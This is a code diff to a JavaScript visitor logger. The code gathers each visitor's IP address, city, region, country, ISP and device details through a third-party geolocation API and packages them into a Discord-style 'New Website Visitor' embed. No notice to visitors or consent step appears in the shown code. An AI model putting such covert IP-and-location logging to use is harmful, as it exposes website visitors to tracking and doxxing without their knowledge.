@@ -8,7 +8,6 @@ function getDeviceInfo() {
   const platform = navigator.platform;
   const language = navigator.language;
 
-  // Simple browser detection from userAgent
   let browserName = "Unknown";
   let browserVersion = "Unknown";
 
@@ -26,23 +25,20 @@ function getDeviceInfo() {
     }
   }
 
-  // Detect device type by userAgent keywords
   const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);
 
   const deviceType = isMobile ? "Mobile" : "Desktop";
 
-  // Screen info
-  const screenWidth = window.screen.width;
-  const screenHeight = window.screen.height;
-  const pixelRatio = window.devicePixelRatio || 1;
-
-  // OS info heuristic
   let osName = "Unknown OS";
   if (platform.indexOf('Win') !== -1) osName = 'Windows';
   else if (platform.indexOf('Mac') !== -1) osName = 'MacOS';
   else if (platform.indexOf('Linux') !== -1) osName = 'Linux';
   else if (/Android/.test(ua)) osName = 'Android';
   else if (/iPhone|iPad|iPod/.test(ua)) osName = 'iOS';
+
+  const screenWidth = window.screen.width;
+  const screenHeight = window.screen.height;
+  const pixelRatio = window.devicePixelRatio || 1;
 
   return {
     browserName,
@@ -59,32 +55,26 @@ function getDeviceInfo() {
 
 async function logVisitorDetails() {
   try {
-    // Get visitor IP and geo info from IP-API
-    const geoRes = await fetch('http://ip-api.com/json?fields=status,message,continent,country,regionName,city,zip,lat,lon,isp,org,as,query');
+    // Use HTTPS ipwhois API for geolocation
+    const geoRes = await fetch('https://ipwhois.app/json/');
     const geoData = await geoRes.json();
-
-    if (geoData.status !== 'success') {
-      console.error('Failed to get geolocation data:', geoData.message);
-      return;
-    }
 
     const deviceInfo = getDeviceInfo();
 
-    // Prepare Discord webhook embed payload
+    // Prepare embed payload
     const embedPayload = {
       username: "Visitor Logger",
       embeds: [{
         title: "New Website Visitor",
         color: 0x00FF00,
         fields: [
-          { name: "IP Address", value: geoData.query || "Unknown", inline: true },
-          { name: "Location", value: `${geoData.city || "Unknown City"}, ${geoData.regionName || "Unknown State"}, ${geoData.country || "Unknown Country"}`, inline: true },
+          { name: "IP Address", value: geoData.ip || "Unknown", inline: true },
+          { name: "Location", value: `${geoData.city || "Unknown City"}, ${geoData.region || "Unknown Region"}, ${geoData.country || "Unknown Country"}`, inline: true },
           { name: "ISP", value: geoData.isp || "Unknown", inline: true },
           { name: "Organization", value: geoData.org || "Unknown", inline: true },
-          { name: "AS", value: geoData.as || "Unknown", inline: true },
+          { name: "AS", value: geoData.asn?.name || "Unknown", inline: true },
           { name: "Timestamp", value: new Date().toISOString(), inline: false },
 
-          // Device info
           { name: "Browser", value: `${deviceInfo.browserName} v${deviceInfo.browserVersion}`, inline: true },
           { name: "Operating System", value: deviceInfo.osName, inline: true },
           { name: "Device Type", value: deviceInfo.deviceType, inline: true },
@@ -93,7 +83,7 @@ async function logVisitorDetails() {
           { name: "Screen Resolution", value: `${deviceInfo.screenWidth} x ${deviceInfo.screenHeight}`, inline: true },
           { name: "Pixel Ratio", value: deviceInfo.pixelRatio.toString(), inline: true }
         ],
-        footer: { text: "Visitor logged via IP-API.com & navigator APIs" }
+        footer: { text: "Visitor logged via ipwhois.app & navigator APIs" }
       }]
     };
 
